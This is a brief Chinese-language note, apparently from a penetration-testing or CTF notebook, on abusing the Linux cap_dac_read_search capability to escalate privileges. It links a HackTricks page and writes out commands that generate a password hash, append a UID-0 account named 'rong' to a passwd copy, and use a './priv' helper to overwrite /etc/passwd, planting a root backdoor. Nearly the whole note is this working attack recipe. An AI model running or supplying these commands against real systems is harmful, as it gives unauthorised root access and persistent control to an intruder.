# cap\_dac\_read\_search滥用提权

脚本最好用2018kali，没报错

```bash
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override
```

```bash
而后写入自己的密码

openssl passwd -1 rong
echo 'rong:$1$Dr9BtZXw$VZ7J.H58FZFtxZi3QdqWF.:0:0:pwned:/root:/bin/bash' >> passwd  
./priv /etc/passwd passwd
```
